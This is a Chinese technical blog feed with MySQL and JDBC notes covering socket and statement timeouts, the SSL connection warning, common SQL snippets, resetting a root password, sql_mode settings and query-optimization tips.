<p>​		JDBC的 timeout在被突然停掉或是发生网络错误（由于设备故障等原因）时十分重要。由于TCP/IP的结构原因，socket没有办法探测到网络错误，因此应用也无法主动发现断开。如果没有设置socket timeout的话，应用在数据库返回结果前会无期限地等下去，这种连接被称为dead connection。</p>
<p>为了避免dead connections，socket必须要有超时配置。socket timeout可以通过JDBC设置，socket timeout能够避免应用在发生网络错误时产生无休止等待的情况，缩短服务失效的时间。</p>
<p>不推荐使用socket timeout来限制statement的执行时长，因此socket timeout的值必须要高于statement timeout，否则，socket timeout将会先生效，这样statement timeout就变得毫无意义，也无法生效。</p>
<p>​		下面展示了socket timeout的两个设置项，不同的JDBC驱动其配置方式会有所不同。</p>
<ul>
<li>
<p>socket连接时的timeout：通过**Socket.connect(SocketAddress endpoint, int timeout)**设置</p>
</li>
<li>
<p>socket读写时的timeout：通过**Socket.setSoTimeout(int timeout)**设置</p>
</li>
</ul>
<p>通过查看CUBRID，MySQL，MS SQL Server (JTDS)和Oracle的JDBC驱动源码，我们发现所有的驱动内部都是使用上面的2个API来设置socket timeout的。</p>
<ul>
<li>connectTimeout和socketTimeout的默认值为0时，timeout不生效。</li>
</ul>
<h3 id="操作系统的socket-timeout配置">操作系统的socket timeout配置</h3>
<p>​		如果不设置 timeout或connect timeout，应用多数情况下是无法发现网络错误的。因此，当网络错误发生后，在连接重新连接成功或成功接收到数据之前，应用会无限制地等下去。但是，通过本文开篇处的实际案例我们发现，30分钟后应用的连接问题奇迹般的解决了，这是因为操作系统同样能够对socket timeout进行配置。公司的Linux服务器将socket timeout设置为了30分钟，从而会在操作系统的层面对网络连接做校验，因此即使JDBC的socket timeout设置为0，由网络错误造成的问题的持续时间也不会超过30分钟。</p>
<p>通常，应用会在调用Socket.read()时由于网络问题被阻塞住，而很少在调用Socket.write()时进入waiting状态，这取决于网络构成和错误类型。当Socket.write()被调用时，数据被写入到操作系统内核的缓冲区，控制权立即回到应用手上。因此，一旦数据被写入内核缓冲区，Socket.write() 调用就必然会成功。但是，如果系统内核缓冲区由于某种网络错误而满了的话，Socket.write()也会进入waiting状态。这种情况下，操作系统会尝试重新发包，当达到重试的时间限制时，将产生系统错误。在我们公司，重新发包的超时时间被设置为15分钟。</p>
<h3 id="FAQ">FAQ</h3>
<p>Q1. 我已经使用Statement.setQueryTimeout()方法设置了查询超时，但在网络出错时并没有产生作用。</p>
<p>➔ 查询超时仅在socket timeout生效的前提下才有效，它并不能用来解决外部的网络错误，要解决这种问题，必须设置JDBC的socket timeout。</p>
<p>Q2. transaction timeout，statement timeout和 timeout和DBCP的配置有什么关系？</p>
<p>➔ 当通过DBCP获取时，除了DBCP获取连接时的waitTimeout配置以外，其他配置对JDBC没有什么影响。</p>
<p>Q3. 如果设置了JDBC的socket timeout，那DBCP连接池中处于IDLE状态的连接是否也会在达到超时时间后被关闭？</p>
<p>➔ 不会。socket的设置只会在产生数据读写时生效，而不会对DBCP中的IDLE连接产生影响。当DBCP中发生新连接创建，老的IDLE连接被移除，或是连接有效性校验的时候，socket设置会对其产生一定的影响，但除非发生网络问题，否则影响很小。</p>
<h2 id="JDBC安全链接警告">JDBC安全链接警告</h2>
<p>用JDBC连接Mysql 5.6的时候，log里面一直有如下的warning, 虽然并不是error，但是log里面在每次连接数据库的时候会一直打印这个warning.</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">WARN: Establishing SSL connection without server<span class="token string">'s identity verification is not recommended. According to MySQL 5.5.45+, 5.6.26+ and 5.7.6+ requirements SSL connection must be established by default if explicit option isn'</span>t <span class="token keyword">set</span><span class="token punctuation">.</span> <span class="token keyword">For</span> compliance <span class="token keyword">with</span> existing applications <span class="token operator">not</span> <span class="token keyword">using</span> SSL the verifyServerCertificate property <span class="token operator">is</span> <span class="token keyword">set</span> <span class="token keyword">to</span> <span class="token string">'false'</span><span class="token punctuation">.</span> You need either <span class="token keyword">to</span> explicitly <span class="token keyword">disable</span> SSL <span class="token keyword">by</span> setting useSSL<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token operator">or</span> <span class="token keyword">set</span> useSSL<span class="token operator">=</span><span class="token boolean">true</span> <span class="token operator">and</span> provide truststore <span class="token keyword">for</span> server certificate verification<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以在JDBC的配置里面添加useSSL=false配置使用非SSL连接即可：</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">jdbc.url</span><span class="token punctuation">=</span><span class="token value attr-value">jdbc:mysql://localhost:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>备注：启用SSL加密连接后，性能必然会有下降</p>
<p>由于SSL开销较大的环节在建立连接，所以短链接的开销可能会更大，因此推荐使用长连接或者连接池的方式来减小SSL所带来的额外开销，不过好在MySQL的应用习惯大部分也是长连接的方式。</p>
<p>总结</p>
<p>1.MySQL 5.7配置SSL要比5.6来的简单的多</p>
<p>2.MySQL 5.7客户端默认开启SSL加密连接</p>
<p>3.通常来说，开启SSL加密连接后，性能最大的开销在25%左右</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL日常使用记录</title>
    <url>/20221031/25158cd7.html</url>
    <content><![CDATA[<h1>MyBaties调用MySQL数据库查询无结果,查询语句正确</h1>
<ol>
<li>DEBUG 进去源码，排查最终提交的SQL语句中文乱码</li>
<li>检查数据库编码是否为UTF-8</li>
<li>修改MySQL的连接配置：<code>jdbc:mysql://127.0.0.1:3306/qhswdxssplog?useUnicode=true&amp;characterEncoding=UTF-8</code></li>
</ol>
<h1>将多行查询结果合并到一行</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">GROUP_CONCAT：默认连接符号是逗号

<span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>A_TABLE_ID<span class="token punctuation">)</span> FRON A_TABLE

<span class="token comment">#查询某分类的所有子分类并用分号连接子分类ID</span>
<span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>A_TABLE_ID SEPARATOR <span class="token string">';'</span><span class="token punctuation">)</span> FRON A_TABLE

<span class="token comment">#查询某分类的所有子分类，根据p_order ASC, cat_id DESC排序后再连接</span>
<span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>cat_id <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> p_order <span class="token keyword">ASC</span><span class="token punctuation">,</span> cat_id <span class="token keyword">DESC</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> goods_cat <span class="token keyword">WHERE</span> pid <span class="token operator">=</span> <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>数据库更新操作关于不同数据库的update set from where操作</h1>
<p>用来同步两个表的数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>Mysql<span class="token punctuation">)</span>语句：
    <span class="token keyword">UPDATE</span> A<span class="token punctuation">,</span> B <span class="token keyword">SET</span> A_1 <span class="token operator">=</span> B_1<span class="token punctuation">,</span> A_2 <span class="token operator">=</span> B_2<span class="token punctuation">,</span> A_3 <span class="token operator">=</span> B_3 <span class="token keyword">WHERE</span> A<span class="token punctuation">.</span>ID <span class="token operator">=</span> B<span class="token punctuation">.</span>ID
<span class="token punctuation">(</span>Oralce<span class="token punctuation">)</span>语句：
    <span class="token keyword">UPDATE</span> A <span class="token keyword">SET</span> <span class="token punctuation">(</span>A1<span class="token punctuation">,</span> A2<span class="token punctuation">,</span> A3<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> B1<span class="token punctuation">,</span> B2<span class="token punctuation">,</span> B3 <span class="token keyword">FROM</span> B <span class="token keyword">WHERE</span> A<span class="token punctuation">.</span>ID <span class="token operator">=</span> B<span class="token punctuation">.</span>ID<span class="token punctuation">)</span>
    <span class="token keyword">WHERE</span> ID <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> B<span class="token punctuation">.</span>ID <span class="token keyword">FROM</span> B <span class="token keyword">WHERE</span> A<span class="token punctuation">.</span>ID <span class="token operator">=</span> B<span class="token punctuation">.</span>ID<span class="token punctuation">)</span>
<span class="token punctuation">(</span>MS <span class="token keyword">SQL</span> Server<span class="token punctuation">)</span>语句：
    <span class="token keyword">UPDATE</span> A <span class="token keyword">SET</span> A1 <span class="token operator">=</span> B1<span class="token punctuation">,</span> A2 <span class="token operator">=</span> B2<span class="token punctuation">,</span> A3 <span class="token operator">=</span> B3 <span class="token keyword">FROM</span> A<span class="token punctuation">,</span> B <span class="token keyword">WHERE</span> A<span class="token punctuation">.</span>ID <span class="token operator">=</span> B<span class="token punctuation">.</span>ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>update set from 语句格式</p>
<p>​		当where和set都需要关联一个表进行查询时，整个 update执行时，就需要对被关联的表进行两次扫描，显然效率比较低。对于这种情况，Sybase和SQL SERVER的解决办法是使用UPDATE…SET…FROM…WHERE…的语法，实际上就是从源表获取更新数据。<br>
​		在 SQL 中，表连接（left join、right join、inner join 等）常常用于 select 语句，其实在 SQL 语法中，这些连接也是可以用于update 和 delete 语句的，在这些语句中使用 join 还常常得到事半功倍的效果。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Update</span> T_OrderForm 
<span class="token keyword">SET</span> T_OrderForm<span class="token punctuation">.</span>SellerID <span class="token operator">=</span>B<span class="token punctuation">.</span>L_TUserID
<span class="token keyword">FROM</span> T_OrderForm A <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> T_ProductInfo B <span class="token keyword">ON</span> B<span class="token punctuation">.</span>L_ID<span class="token operator">=</span>A<span class="token punctuation">.</span>ProductID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>​</p>
<h1>获取建表命令</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">create</span> <span class="token keyword">table</span> 旧表<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样会将旧表的创建命令列出。我们只需要将该命令拷贝出来，更改table的名字，就可以建立一个完全一样的表</p>
<h1>将表1内容全部复制到表2</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">复制旧表的数据到新表<span class="token punctuation">(</span>假设两个表结构一样<span class="token punctuation">)</span>
   <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> 表<span class="token number">2</span> <span class="token keyword">FROM</span> 表<span class="token number">1</span><span class="token punctuation">;</span>
   
复制旧表的数据到新表<span class="token punctuation">(</span>假设两个表结构不一样<span class="token punctuation">)</span>
   <span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> 新表<span class="token punctuation">(</span>字段<span class="token number">1</span><span class="token punctuation">,</span>字段<span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> 
   <span class="token keyword">SELECT</span> 字段<span class="token number">1</span><span class="token punctuation">,</span>字段<span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">FROM</span> 旧表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>修改表/字段的注释</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">创建表的时候写注释
   <span class="token keyword">create</span> <span class="token keyword">table</span> test1<span class="token punctuation">(</span>field_name <span class="token keyword">int</span> <span class="token keyword">comment</span> <span class="token string">'字段的注释'</span><span class="token punctuation">)</span> <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">'表的注释'</span><span class="token punctuation">;</span>
   
修改表的注释
   <span class="token keyword">alter</span> <span class="token keyword">table</span> test1 <span class="token keyword">comment</span> <span class="token string">'修改后的表的注释'</span><span class="token punctuation">;</span>

修改字段的注释<span class="token comment">--注意：字段名和字段类型照写就行</span>
   <span class="token keyword">alter</span> <span class="token keyword">table</span> test1 <span class="token keyword">modify</span> <span class="token keyword">column</span> field_name <span class="token keyword">int</span> <span class="token keyword">comment</span> <span class="token string">'修改后的字段注释'</span><span class="token punctuation">;</span>
   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>数据表切换数据库</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">RENAME</span> <span class="token keyword">TABLE</span> db_A<span class="token punctuation">.</span>table_1 <span class="token keyword">TO</span> db_B<span class="token punctuation">.</span>table_2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1>MySQL自增主键列重新排列</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名 <span class="token keyword">DROP</span> 列名<span class="token punctuation">;</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名 <span class="token keyword">ADD</span> 列名 <span class="token keyword">MEDIUMINT</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">FIRST</span><span class="token punctuation">;</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名 <span class="token keyword">MODIFY</span> <span class="token keyword">COLUMN</span> 列名 <span class="token keyword">MEDIUMINT</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span><span class="token keyword">ADD</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>列名<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1>自动修改更改时间</h1>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> ware_resource_info <span class="token keyword">MODIFY</span> res_create_time <span class="token keyword">TIMESTAMP</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CURRENT_TIMESTAMP</span><span class="token punctuation">;</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> ware_resource_info <span class="token keyword">MODIFY</span> modify_time <span class="token keyword">TIMESTAMP</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CURRENT_TIMESTAMP</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CURRENT_TIMESTAMP</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h1>linux下mysql-5.6忘记root密码</h1>
<p>在linux平台下使用mysql过程中忘记了root密码，对于运维和DBA来讲都是一件头疼的事情，下面来讲解下怎么进行重置mysql数据库root 密码：</p>
<ol>
<li>
<p>停止mysql服务进程： <strong>service mysqld stop</strong></p>
</li>
<li>
<p>然后编辑mysql的配置文件my.cnf  <strong>vim /etc/my.cnf</strong></p>
</li>
<li>
<p>找到 [mysqld]这个模块：在最后面添加一段代码，可忽略mysql权限问题，直接登录</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">skip<span class="token operator">-</span><span class="token keyword">grant</span><span class="token operator">-</span><span class="token keyword">tables</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>​		然后保存 :wq!退出</p>
<p>​		启动mysql服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> mysqld start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接进入mysql数据库：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Starting MySQL. SUCCESS<span class="token operator">!</span>
<span class="token punctuation">[</span>root@web1 ~<span class="token punctuation">]</span><span class="token comment"># mysql</span>
Welcome to the MySQL monitor. Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
Your MySQL connection <span class="token function">id</span> is <span class="token number">1</span>
Server version: <span class="token number">5.6</span>.34 Source distribution

Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>, <span class="token number">2016</span>, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.
mysql<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用mysql表，然后进行修改mysql的root密码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">&gt;</span> use mysql<span class="token punctuation">;</span> <span class="token comment">#使用mysql数据库</span>
Reading table information <span class="token keyword">for</span> completion of table and <span class="token function">column</span> names
You can turn off this feature to get a quicker startup with <span class="token parameter variable">-A</span>

Database changed
mysql<span class="token operator">&gt;</span> update user <span class="token builtin class-name">set</span> <span class="token assign-left variable">password</span><span class="token operator">=</span>password<span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span> where <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">;</span><span class="token comment">#更新密码</span>
Query OK, <span class="token number">4</span> rows affected <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>
Rows matched: <span class="token number">4</span> Changed: <span class="token number">4</span> Warnings: <span class="token number">0</span>

mysql<span class="token operator">&gt;</span> flush privileges<span class="token punctuation">;</span><span class="token comment">#刷新权限</span>
Query OK, <span class="token number">0</span> rows affected <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>补充说明：5.7的更新语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">set</span> authentication_string<span class="token operator">=</span>password<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@web1 ~<span class="token punctuation">]</span><span class="token comment"># ps -ef |grep mysql #显示mysql现有的进程</span>
root <span class="token number">56407</span> <span class="token number">1</span> <span class="token number">0</span> <span class="token number">17</span>:50 pts/0 00:00:00 /bin/sh /usr/local/mysql/bin/mysqld_safe <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/data/mysql --pid-file<span class="token operator">=</span>/data/mysql/web1.pid
mysql <span class="token number">56533</span> <span class="token number">56407</span> <span class="token number">0</span> <span class="token number">17</span>:50 pts/0 00:00:00 /usr/local/mysql/bin/mysqld <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr/local/mysql <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/data/mysql --plugin-dir<span class="token operator">=</span>/usr/local/mysql/lib/plugin <span class="token parameter variable">--user</span><span class="token operator">=</span>mysql --log-error<span class="token operator">=</span>/data/mysql/web1.err --pid-file<span class="token operator">=</span>/data/mysql/web1.pid
root <span class="token number">56560</span> <span class="token number">1737</span> <span class="token number">0</span> <span class="token number">17</span>:55 pts/0 00:00:00 <span class="token function">grep</span> mysql
<span class="token punctuation">[</span>root@web1 ~<span class="token punctuation">]</span><span class="token comment"># killall mysqld #删除mysql现有进程</span>
<span class="token punctuation">[</span>root@web1 ~<span class="token punctuation">]</span><span class="token comment"># ps -ef |grep mysql</span>
root <span class="token number">56566</span> <span class="token number">1737</span> <span class="token number">0</span> <span class="token number">17</span>:56 pts/0 00:00:00 <span class="token function">grep</span> mysql
<span class="token punctuation">[</span>root@web1 ~<span class="token punctuation">]</span><span class="token comment"># service mysqld start #重新启动mysql服务</span>
Starting MySQL. SUCCESS<span class="token operator">!</span>
<span class="token punctuation">[</span>root@web1 ~<span class="token punctuation">]</span><span class="token comment"># mysql -uroot -p #使用新密码登录</span>
Enter password:
Welcome to the MySQL monitor. Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
Your MySQL connection <span class="token function">id</span> is <span class="token number">1</span>
Server version: <span class="token number">5.6</span>.34 Source distribution

Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2000</span>, <span class="token number">2016</span>, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the current input statement.

mysql<span class="token operator">&gt;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>MySQL5.7.X版本only_full_group_by问题解决</h1>
<ol>
<li>
<p>报错信息</p>
<pre class="line-numbers language-none"><code class="language-none">[Err] 1055 - Expression #1 of ORDER BY clause is not in GROUP BY clause and contains nonaggregated column 'information_schema.PROFILING.SEQ' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以看出是因为sql_mode中设置了only_full_group_by模式引起的。</p>
</li>
<li>
<p>sql_mode的作用是什么呢</p>
<p>模式定义MySQL会支持哪些SQL语法。以及应执行哪种数据验证检查。最终达到的目标：适应在不同环境中适应mysql，因为可以根据各自的程序设置不同的操作模式。</p>
<p>在only_full_group_by这种模式下，使用group by语句进行查询时，所要查询的语句必须依赖于group by子句中所列出的列，也就是group by要以查询的字段作为分组依据，这里是要查询的所有字段。</p>
</li>
<li>
<p>常用的sql_mode</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>ONLY_FULL_GROUP_BY</td>
<td>对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP  BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中</td>
</tr>
<tr>
<td>NO_AUTO_VALUE_ON_ZERO</td>
<td>该值影响自增长列的插入。<br>默认设置下，插入0或NULL代表生成下一个自增长值。如果用户  希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。</td>
</tr>
<tr>
<td>STRICT_TRANS_TABLES</td>
<td>在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE。在严格模式下，不允许日期和月份为零。</td>
</tr>
<tr>
<td>NO_ZERO_DATE</td>
<td>设置该值，MySQL数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</td>
</tr>
<tr>
<td>ERROR_FOR_DIVISION_BY_ZERO</td>
<td>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL</td>
</tr>
<tr>
<td>NO_AUTO_CREATE_USER</td>
<td>禁止GRANT创建密码为空的用户</td>
</tr>
<tr>
<td>NO_ENGINE_SUBSTITUTION</td>
<td>如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</td>
</tr>
<tr>
<td>PIPES_AS_CONCAT</td>
<td>将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</td>
</tr>
<tr>
<td>ANSI_QUOTES</td>
<td>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>查询当前的sql_mode配置</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1.</span> 可以使用<span class="token keyword">select</span> @<span class="token variable">@global.sql_mode</span><span class="token punctuation">;</span> <span class="token comment">//全局配置 查询，</span>

<span class="token number">2.</span> 也可以通过<span class="token keyword">select</span> @<span class="token variable">@sql_mode</span><span class="token punctuation">;</span><span class="token comment">//已存在数据库配置查询</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>解决方法</p>
<ul>
<li>
<p>使用<code>any_value()</code>函数,这个函数对不需要group by的字段有效，等同于关闭only_full_group_by，但是这样难免会遗漏某个字段，所以不推荐使用。</p>
</li>
<li>
<p>暂时性关闭（可以通过select @@sql_mode查出sql_mode以后去掉ONLY_FULL_GROUP_BY后复制过来），但是在重启服务以后失效</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> sql_mode<span class="token operator">=</span><span class="token string">' '</span> <span class="token comment">//改变已经存在的数据库sql_mode </span>
<span class="token keyword">set</span> @<span class="token variable">@global.sql_mode</span><span class="token operator">=</span><span class="token string">' '</span> <span class="token comment">//改变全局配置sql_mode</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>更改配置文件（推荐使用）</p>
<pre class="line-numbers language-none"><code class="language-none">可以通过select @@sql_mode查出sql_mode以后去掉ONLY_FULL_GROUP_BY后复制配置参数

linux系统
更改/etc/my.cnf文件
使用vi命令打开，如果有sql_mode=...的注释就把注释打开，如果没有就加上sql_mode=...

Windows系统
修改安装目录下的my.ini文件，其余同上
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>点滴</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL查询优化策略</title>
    <url>/20221031/ec788ee4.html</url>
    <content><![CDATA[<h1>查询优化策略</h1>
<table>
<thead>
<tr>
<th>建议</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td>不要使用 select * from t</td>
<td>任何地方都不要使用  select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段</td>
</tr>
<tr>
<td>控制查询结果的大小</td>
<td>尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。</td>
</tr>
<tr>
<td>考虑在 where 及  order by 涉及的列上建立索引</td>
<td></td>
</tr>
<tr>
<td>避免在 where 子句中使用!=或&lt;&gt;操作符</td>
<td>否则将引擎放弃使用索引而进行全表扫描</td>
</tr>
<tr>
<td>避免在 where 子句中对字段进行 null 值判断<br>（可以用空白或0这样的默认值替代W）</td>
<td>否则将引擎放弃使用索引而进行全表扫描</td>
</tr>
<tr>
<td>LEFT JOIN 将可能的组合条件放到Where中</td>
<td></td>
</tr>
<tr>
<td>查询时候的like条件，减少前置百分号</td>
<td>考虑全文检索？</td>
</tr>
<tr>
<td>尽量避免在 where 子句中使用 or 来连接条件</td>
<td>否则将引擎放弃使用索引而进行全表扫描： <br>select id from t where num=10 or num=20<br>可以这样查询：<br>select id from t where num=10<br>union all<br>select id from t where num=20</td>
</tr>
<tr>
<td>in 和 not in 也要慎用，否则会导致全表扫描</td>
<td>select id from  t where num in(1,2,3)<br>对于连续的数值，能用 between 就不要用 in 了<br>select id from t where num between 1 and 3</td>
</tr>
<tr>
<td>很多时候可以用  exists 代替 in</td>
<td>select num from  a where num in(select num from b) <br>用下面的语句替换：<br>select num from a where exists(select 1 from b where num=a.num)</td>
</tr>
<tr>
<td>使用数字型字段（数据只含有数字）</td>
<td>若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。<br>这是因为引擎在处理查询和连接时会 逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。</td>
</tr>
<tr>
<td>避免在 where 子句中对字段进行表达式操作或者函数操作等</td>
<td>否则将导致引擎放弃使用索引而进行全表扫描。<br>如：select id from  t where num/2=100<br>应改为: select id from  t where num=100*2<br><br>select id from t where substring(name,1,3)=’abc’;<br>select id from t where datediff(day,createdate,’2005-11-30′)=0<br>应改为:<br>select id from t where name like ‘abc%’<br>select id from t where createdate &gt;= ’2005-11-30′ and createdate &lt; ’2005-12-1′<br></td>
</tr>
<tr>
<td>使用符合索引，查询条件必须使用到其第一个字段。</td>
<td>在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件时才能保证系统使用该索引，否则该索引将不会被使 用，并且应尽可能的让字段顺序与索引顺序相一致。</td>
</tr>
<tr>
<td>不要写一些没有意义的查询，减少资源占用</td>
